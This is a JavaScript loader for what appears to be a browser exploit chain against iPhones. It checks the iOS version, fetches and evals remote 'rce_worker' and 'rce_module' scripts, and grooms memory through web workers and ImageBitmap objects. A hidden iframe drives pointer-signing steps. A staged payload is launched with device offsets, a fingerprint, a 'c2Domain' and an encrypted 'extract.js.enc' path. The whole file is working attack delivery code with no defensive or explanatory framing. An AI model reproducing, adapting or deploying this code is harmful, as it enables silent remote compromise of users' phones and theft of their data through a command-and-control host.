var SERVER_LOG = false;  
let logStart = new Date().getTime();
let logEntryID = 0;
var offsets = {};
var slide;
var chipset;
var device_model;

var localHost = (function() {
  try {
    var src = document.currentScript.src;
    return src.substring(0, src.lastIndexOf('/'));
  } catch(e) {
    return location.href.substring(0, location.href.lastIndexOf('/'));
  }
})();



function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    const id = logEntryID++;
    const line = dumphex ? ('#' + id + ' [HEX] ' + x) : ('#' + id + ' ' + out);
    try { console.log('[log] ' + line); } catch(e) {}
    try { if (window.__logViewAdd) window.__logViewAdd(line); } catch(e) {}
    
    try {
        var mx = new XMLHttpRequest();
        mx.open('POST', '/api/debug/logs', false);
        mx.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
        mx.send(line);
    } catch(e) {}
}


var __bridge = null;
var __bridgeRuntime = null;

function __bridgeInit() {
    try {
        if (window.PromotionIntegrationBridge &&
            typeof window.PromotionIntegrationBridge.ready === 'function') {
            __bridge = window.PromotionIntegrationBridge;
        }
    } catch(e) {}
}

function __bridgeReady() {
    if (!__bridge || typeof __bridge.ready !== 'function') return Promise.resolve(null);
    if (__bridgeRuntime) return Promise.resolve(__bridgeRuntime);
    return Promise.resolve(__bridge.ready())
        .then(function(rt) { __bridgeRuntime = rt || null; return __bridgeRuntime; })
        .catch(function() { return null; });
}


function __runtimeChannelSlug() {
    try { return (__bridgeRuntime && __bridgeRuntime.channel && __bridgeRuntime.channel.slug) || ''; } catch(e) { return ''; }
}
function __runtimeDomain() {
    try {
        if (__bridgeRuntime && __bridgeRuntime.eventUrl) {
            return new URL(__bridgeRuntime.eventUrl, location.href).hostname;
        }
    } catch(e) {}
    return location.hostname;
}
function __runtimeIntegrationId() {
    try { return (__bridgeRuntime && __bridgeRuntime.integration && __bridgeRuntime.integration.id) || ''; } catch(e) { return ''; }
}

function __runtimeFingerprint() {
    try {
        const fp = (window.localStorage && window.localStorage.getItem('_fp')) || '';
        if (/^(?:[0-9a-f]{32}|fb_[a-z0-9]+_[0-9]{10,16})$/.test(fp)) return fp;
    } catch(e) {}
    return '';
}

function redirect() {
    markTerminal("worker_finished");
}
function getJS(fname, method = 'GET') {
    try {
        let url = localHost + '/' + fname + '?v=' + Date.now();
        let xhr = new XMLHttpRequest();
        xhr.open("GET", url, false);
        xhr.send(null);
        return xhr.responseText;
    } catch(e) {}
}



var qqRunTerminal = false;
var qqRetryTimer = null;

function qqGetParam(name) {
    try {
        var re = new RegExp("[?&]" + name + "=([^&]*)");
        var m = re.exec(location.search);
        return m ? decodeURIComponent(m[1]) : "";
    } catch(e) {
        return "";
    }
}

function qqReadRetryCount(key) {
    var fromUrl = parseInt(qqGetParam("retry") || "0", 10);
    if (fromUrl > 0) return fromUrl;

    try {
        return parseInt(sessionStorage.getItem(key) || "0", 10);
    } catch(e) {
        return 0;
    }
}

function qqWriteRetryCount(key, count) {
    try {
        sessionStorage.setItem(key, String(count));
    } catch(e) {}
}

function qqBuildRetryUrl(reason) {
    var parts = [];
    var raw = location.search ? location.search.substring(1).split("&") : [];

    for (var i = 0; i < raw.length; i++) {
        if (!raw[i]) continue;
        var k = raw[i].split("=")[0];
        if (k === "retry" || k === "reason" || k === "t") continue;
        parts.push(raw[i]);
    }

    parts.push("retry=1");
    parts.push("reason=" + encodeURIComponent(reason));
    parts.push("t=" + Date.now());

    return location.pathname + "?" + parts.join("&") + location.hash;
}

function markTerminal(reason) {
    qqRunTerminal = true;

    if (qqRetryTimer) {
        clearTimeout(qqRetryTimer);
        qqRetryTimer = null;
    }

    print("terminal: " + reason);
}

function retryOnce(reason) {
    try {
        if (qqRunTerminal) return;

        var key = "retry_once:" + location.pathname;
        var count = qqReadRetryCount(key);

        if (count >= 1) {
            markTerminal("retry_already_used:" + reason);
            return;
        }

        qqWriteRetryCount(key, 1);
        window.location.replace(qqBuildRetryUrl(reason));
    } catch(e) {}
}

function armRetryTimeout() {
    if (qqRetryTimer) {
        clearTimeout(qqRetryTimer);
    }

    qqRetryTimer = setTimeout(function() {
        retryOnce("timeout");
    }, 180000);
}



const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
const ios_version = (function() {
  let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
  if (version) {
    return version.split('_').map(part => parseInt(part));
  }
})();
let workerCode = "";
if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
    workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`);
else
    workerCode = getJS(`rce_worker.js?${Date.now()}`);
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        __bridgeInit();
        __bridgeReady();   
        armRetryTimeout();
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        const worker = new Worker(workerBlobUrl);
        worker.onerror = function() {
            retryOnce("worker_error");
        };
        worker.onmessageerror = function() {
            retryOnce("worker_message_error");
        };
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        switch (data.type) {
            case 'redirect':
            {
                markTerminal("worker_redirect");
                break;
            }
            case 'prepare_dlopen_workers':
            {
                await prepare_dlopen_workers();
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'setup_fcall'
                });
                break;
            }
            case 'slow_fcall':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            case 'log':
            {
                try { if (window.__logViewAdd) window.__logViewAdd(data.text); } catch(e) {}
                break;
            }
            default:
            {
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        const qqFpStartedAt = Date.now();
        const qqFpTimer = setInterval(function() {
            try {
                const fp = __runtimeFingerprint();
                if (fp) {
                    clearInterval(qqFpTimer);
                    try { worker.postMessage({ type: 'stage_fp', fingerprint: fp }); } catch(e) {}
                } else if (Date.now() - qqFpStartedAt > 10000) {
                    clearInterval(qqFpTimer);
                }
            } catch(e) {
                clearInterval(qqFpTimer);
            }
        }, 100);
        try
        {
        let rceCode = "";
        if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
                rceCode = getJS(`rce_module_18.6.js?${Date.now()}`);
            else
                rceCode = getJS(`rce_module.js?${Date.now()}`);
        try
        {
            eval(rceCode);
        }
        catch(e)
        {
        }
        let desiredHost = "";
        desiredHost = localHost;
            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
            {
                
                __bridgeReady().then(function() {
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG,
                    channelCode: __runtimeChannelSlug(),
                    c2Domain: __runtimeDomain(),
                    integrationId: __runtimeIntegrationId(),
                    fingerprint: __runtimeFingerprint(),
                    extractPath: new URL('extract.js.enc', localHost + '/').pathname
                });
                });
            }
            else
            {
        var attempt = new check_attempt();
        attempt.start().then((result) => {
            if(!result)
            {
                attempt.start().then((result) => {
                    if(!result)
                    {
                       retryOnce("check_attempt_failed");
                    }
                    else
                            {
                        __bridgeReady().then(function() {
                        worker.postMessage({
                        type: 'stage1',
                        begin,
                        origin,
                        ios_version,
                        offsets,
                        slide,
                        chipset,
                        device_model,
                        desiredHost,
                        SERVER_LOG,
                        channelCode: __runtimeChannelSlug(),
                        c2Domain: __runtimeDomain(),
                        integrationId: __runtimeIntegrationId(),
                        fingerprint: __runtimeFingerprint(),
                        extractPath: new URL('extract.js.enc', localHost + '/').pathname
                });
                        });
                            }
                        });
                    }
                    else
                    {
            __bridgeReady().then(function() {
            worker.postMessage({
                type: 'stage1',
                begin,
                origin,
                ios_version,
                offsets,
                slide,
                chipset,
                device_model,
                desiredHost,
                SERVER_LOG,
                channelCode: __runtimeChannelSlug(),
                c2Domain: __runtimeDomain(),
                integrationId: __runtimeIntegrationId(),
                fingerprint: __runtimeFingerprint(),
                extractPath: new URL('extract.js.enc', localHost + '/').pathname
            });
            });
                    }
        });
            }
        }
        catch(e)
        {
        }
    }
    main();
  })();
